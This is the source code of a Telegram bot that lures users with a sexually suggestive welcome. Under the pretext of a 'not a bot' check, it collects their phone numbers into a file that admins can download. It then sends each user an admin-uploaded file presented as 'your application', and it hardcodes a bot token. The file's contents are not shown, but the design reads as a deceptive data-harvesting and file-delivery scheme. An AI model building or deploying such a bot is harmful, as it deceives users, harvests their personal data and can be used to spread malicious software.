from flask import Flask, request
import telebot
from telebot import types
import os
from datetime import datetime
import requests
import json
import time
import requests.exceptions

WEBHOOK_URL = 'https://bot-ucxu.onrender.com'
TOKEN = '8452824144:AAHp4mUK1l2IvAol4lhiqDuJSrz0lhdqhp4'
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

ARCHIVE_FILE = 'phone_numbers.txt'
FILE_STORAGE = 'saved_file.txt'
REFERRAL_FILE = 'referrals.json'

ADMIN_IDS = [1285348887, 7890456034]

user_state = {}
last_city = {}
bot_enabled = True  # Стан роботи бота

# === Реферали ===
def load_referrals():
    if os.path.exists(REFERRAL_FILE):
        with open(REFERRAL_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_referrals(data):
    with open(REFERRAL_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

referrals = load_referrals()

def count_referrals(user_id):
    return len(referrals.get(str(user_id), []))

# === Клавіатури ===
def main_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.row(
        types.KeyboardButton("🔥 Начать"),
        types.KeyboardButton("👤 Реферальная система")
    )
    keyboard.row(
        types.KeyboardButton("⚙️ Поддержка"),
        types.KeyboardButton("📂 Меню")
    )
    return keyboard

def request_phone_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button_phone = types.KeyboardButton(text="📞 Поделиться номером", request_contact=True)
    keyboard.add(button_phone)
    return keyboard

def city_input_keyboard(chat_id):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    buttons = []
    if chat_id in last_city:
        buttons.append(types.KeyboardButton(last_city[chat_id]))
    buttons.append(types.KeyboardButton("📂 Меню"))
    keyboard.add(*buttons)
    return keyboard

def is_valid_city(city_name):
    url = 'https://nominatim.openstreetmap.org/search'
    params = {
        'q': city_name,
        'format': 'json',
        'addressdetails': 1,
        'limit': 3,
        'accept-language': 'ru'
    }
    try:
        response = requests.get(url, params=params, headers={'User-Agent': 'TelegramBot'})
        data = response.json()
        if not data:
            return False

        for place in data:
            address = place.get('address', {})
            valid_keys = ['city', 'town', 'village', 'municipality', 'county', 'state', 'region', 'hamlet', 'locality']
            if any(k in address for k in valid_keys):
                display_name = place.get('display_name', '').lower()
                if city_name.lower() in display_name:
                    return True
        return False
    except Exception as e:
        print(f"Error checking city: {e}")
        return False

# === Команди ===
@bot.message_handler(commands=['start'])
def start_handler(message):
    global bot_enabled
    if not bot_enabled:
        bot.send_message(message.chat.id, "🚫 Бот временно отключен, попобуйте позже.")
        return

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref"):
        ref_id = args[1][3:]
        if str(ref_id).isdigit() and str(ref_id) != str(message.from_user.id):
            user_id_str = str(ref_id)
            new_user = str(message.from_user.id)
            if user_id_str not in referrals:
                referrals[user_id_str] = []
            if new_user not in referrals[user_id_str]:
                referrals[user_id_str].append(new_user)
                save_referrals(referrals)

    welcome_text = (
        "Привет, незнакомец... 😏\n\n"
        "Ты оказался в приватном пространстве, где сбываются самые смелые фантазии.\n"
        "Здесь нет стыда. Нет запретов. Только желания, страсть и немного дерзости.\n\n"
        "👇 Выбери, с чего хочешь начать:"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())

@bot.message_handler(commands=['on'])
def bot_on(message):
    global bot_enabled
    if message.from_user.id in ADMIN_IDS:
        bot_enabled = True
        bot.send_message(message.chat.id, "✅ Бот включён.")

@bot.message_handler(commands=['off'])
def bot_off(message):
    global bot_enabled
    if message.from_user.id in ADMIN_IDS:
        bot_enabled = False
        bot.send_message(message.chat.id, "🛑 Бот отключён.")

@bot.message_handler(commands=['upload'])
def upload_file_command(message):
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "Отправь мне файл, который нужно сохранить.")
    else:
        bot.send_message(message.chat.id, "⛔️ У тебя нет прав для этой команды.")

@bot.message_handler(commands=['getphones'])
def get_phones_handler(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "⛔️ У тебя нет прав для этой команды.")
        return
    if not os.path.exists(ARCHIVE_FILE):
        bot.send_message(message.chat.id, "Архив ещё не создан.")
        return
    with open(ARCHIVE_FILE, 'rb') as f:
        bot.send_document(message.chat.id, f, caption="Архив номеров телефонов 📁")

@bot.message_handler(content_types=['document'])
def save_admin_file(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "⛔️ У тебя нет прав для загрузки файлов.")
        return
    file_id = message.document.file_id
    with open(FILE_STORAGE, 'w') as f:
        f.write(file_id)
    bot.send_message(message.chat.id, "✅ Файл сохранён. Пользователи будут получать его после выбора города.")

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    global bot_enabled
    if not bot_enabled:
        bot.send_message(message.chat.id, "🚫 Бот временно отключен, попобуйте позже.")
        return

    if message.contact:
        phone_number = message.contact.phone_number
        user_id = message.from_user.id
        username = message.from_user.username or "NoUsername"
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        if not is_user_verified(user_id):
            with open(ARCHIVE_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{user_id} | @{username} | {phone_number} | {now}\n")
        bot.send_message(message.chat.id, f"Спасибо! Твой номер {phone_number} сохранён 🔐.")
        bot.send_message(message.chat.id, "✏️ Введите название вашего города:", reply_markup=city_input_keyboard(message.chat.id))
        user_state[message.chat.id] = 'awaiting_city'
    else:
        bot.send_message(message.chat.id, "Не удалось получить номер телефона.")

@bot.message_handler(func=lambda message: message.content_type == 'text')
def button_handler(message):
    global bot_enabled
    if not bot_enabled and message.text not in ['/on', '/off']:
        bot.send_message(message.chat.id, "🚫 Бот временно отключен, попобуйте позже.")
        return

    user_id = message.from_user.id
    text = message.text.strip()

    if text == "🔥 Начать":
        if not is_user_verified(user_id):
            bot.send_message(
                message.chat.id,
                "Пожалуйста, подтвердите, что вы не бот.\nПоделитесь своим номером телефона:",
                reply_markup=request_phone_keyboard()
            )
        else:
            bot.send_message(message.chat.id, "✏️ Введите название вашего города:", reply_markup=city_input_keyboard(message.chat.id))
            user_state[message.chat.id] = 'awaiting_city'

    elif text == "👤 Реферальная система":
        user_ref_link = f"https://t.me/{bot.get_me().username}?start=ref{user_id}"
        count = count_referrals(user_id)
        balance = count * 100
        msg = (
            f"👥 *Реферальная система*\n\n"
            f"🔗 Ваша ссылка:\n{user_ref_link}\n\n"
            f"💰 Вы пригласили: *{count}* человек(а)\n"
            f"🏆 Баланс: *{balance}* баллов\n\n"
            f"За каждого приглашённого вы получаете *100 баллов* внутри приложения."
        )
        bot.send_message(message.chat.id, msg, parse_mode="Markdown", reply_markup=main_keyboard())

    elif text == "⚙️ Поддержка":
        bot.send_message(message.chat.id, "Напишите @Qk_support для связи с поддержкой.")

    elif text == "📂 Меню":
        bot.send_message(message.chat.id, "Главное меню.", reply_markup=main_keyboard())
        user_state.pop(message.chat.id, None)

    elif user_state.get(message.chat.id) == 'awaiting_city':
        city = text
        if city == "📂 Меню":
            bot.send_message(message.chat.id, "Возвращаемся в главное меню.", reply_markup=main_keyboard())
            user_state.pop(message.chat.id, None)
            return

        if is_valid_city(city):
            last_city[message.chat.id] = city
            del user_state[message.chat.id]
            proceed_after_city_selection(message.chat.id, city)
        else:
            bot.send_message(message.chat.id, "❌ Город не найден. Пожалуйста, введите корректное название города:", reply_markup=city_input_keyboard(message.chat.id))

# === Допоміжні ===
def is_user_verified(user_id):
    if not os.path.exists(ARCHIVE_FILE):
        return False
    with open(ARCHIVE_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            if line.startswith(str(user_id) + " |"):
                return True
    return False

def send_saved_file(chat_id):
    if not os.path.exists(FILE_STORAGE):
        bot.send_message(chat_id, "❌ Файл ещё не загружен администратором.")
        return
    with open(FILE_STORAGE, 'r') as f:
        file_id = f.read().strip()
    try:
        bot.send_document(chat_id, file_id, caption="📎 Вот ваше приложение\n Если у вас что-то не выходит с запуском или установкой — обратитесь в поддержку.")
    except Exception as e:
        bot.send_message(chat_id, f"Ошибка при отправке файла: {e}")

def proceed_after_city_selection(chat_id, city_name):
    bot.send_message(chat_id, f"Ты выбрал: {city_name} 🏙️")
    send_saved_file(chat_id)
    bot.send_message(chat_id, "Отлично! Наслаждайся 💫")

# === Flask вебхук ===
@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return 'ok', 200

# === Установка webhook ===
@app.route('/setwebhook', methods=['GET'])
def set_webhook():
    bot.remove_webhook()
    success = bot.set_webhook(url=WEBHOOK_URL + '/webhook')
    return f'Webhook set: {success}', 200


# === Старт Flask сервера ===
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
